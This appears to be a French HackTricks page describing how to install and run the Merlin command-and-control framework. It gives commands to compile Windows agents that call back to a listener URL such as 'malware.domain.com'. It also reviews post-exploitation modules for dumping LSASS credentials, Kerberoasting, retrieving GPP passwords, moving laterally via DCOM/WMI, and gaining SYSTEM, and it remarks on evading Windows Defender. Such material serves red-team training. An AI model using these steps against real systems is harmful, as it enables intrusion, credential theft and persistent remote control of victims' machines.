<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>


# Installation

## Installer GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Installer Merlin

Install Merlin by running the following command:

```bash
git clone https://github.com/Ne0nd0g/merlin.git
```
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Lancer le serveur Merlin
```
go run cmd/merlinserver/main.go -i
```
# Agents de Merlin

Vous pouvez [télécharger des agents précompilés](https://github.com/Ne0nd0g/merlin/releases)

## Compiler les Agents

Allez dans le dossier principal _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **Agents de compilation manuelle**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# Modules

**La mauvaise nouvelle est que chaque module utilisé par Merlin est téléchargé depuis la source (Github) et enregistré sur le disque avant d'être utilisé. Faites attention lorsque vous utilisez des modules bien connus car Windows Defender vous attrapera!**


**SafetyKatz** --> Mimikatz modifié. Dump LSASS dans un fichier et lance:sekurlsa::logonpasswords vers ce fichier\
**SharpDump** --> minidump pour l'ID de processus spécifié (LSASS par défaut) (Il est dit que l'extension du fichier final est .gz mais en réalité c'est .bin, mais c'est un fichier .gz)\
**SharpRoast** --> Kerberoast (ne fonctionne pas)\
**SeatBelt** --> Tests de sécurité locaux dans CS (ne fonctionne pas) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> Compilation en utilisant csc.exe /unsafe\
**Sharp-Up** --> Tous les checks en C# dans powerup (fonctionne)\
**Inveigh** --> Outil de spoofing et d'homme du milieu PowerShellADIDNS/LLMNR/mDNS/NBNS (ne fonctionne pas, besoin de charger: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> Impersonne tous les utilisateurs disponibles et récupère une réponse de défi pour chacun (hachage NTLM pour chaque utilisateur) (mauvaise URL)\
**Invoke-PowerThIEf** --> Vole des formulaires à partir d'IExplorer ou le fait exécuter du JS ou injecte une DLL dans ce processus (ne fonctionne pas) (et le PS semble ne pas fonctionner non plus) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> Obtient les mots de passe du navigateur (fonctionne mais ne imprime pas le répertoire de sortie)\
**dumpCredStore** --> API du gestionnaire d'informations d'identification Win32 (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> Détecte l'injection classique dans les processus en cours d'exécution (Injection classique (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (ne fonctionne pas)\
**Get-OSTokenInformation** --> Obtient les informations de jeton des processus et threads en cours d'exécution (Utilisateur, groupes, privilèges, propriétaire… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> Exécute une commande (sur un autre ordinateur) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> Exécute une commande sur un autre PC en abusant des objets COM de PowerPoint (ADDin)\
**Invoke-ExcelMacroPivot** --> Exécute une commande sur un autre PC en abusant de DCOM dans Excel\
**Find-ComputersWithRemoteAccessPolicies** --> (ne fonctionne pas) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> Il extrait toutes les parties les plus intéressantes de la stratégie de groupe et fouille ensuite dedans pour trouver des éléments exploitables. (obsolète) Jetez un œil à Grouper2, ça a l'air vraiment bien\
**Invoke-WMILM** --> WMI pour se déplacer latéralement\
**Get-GPPPassword** --> Recherche de groups.xml, scheduledtasks.xml, services.xml et datasources.xml et renvoie les mots de passe en clair (dans le domaine)\
**Invoke-Mimikatz** --> Utilise mimikatz (creds par défaut)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Vérifie les privilèges des utilisateurs sur les ordinateurs\
**Find-PotentiallyCrackableAccounts** --> Récupère des informations sur les comptes d'utilisateur associés à SPN (Kerberoasting)\
**psgetsystem** --> obtient le système

**N'a pas vérifié les modules de persistance**

# Résumé

J'aime vraiment la sensation et le potentiel de l'outil.\
J'espère que l'outil commencera à télécharger les modules depuis le serveur et intégrera une sorte d'évasion lors du téléchargement de scripts.


<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
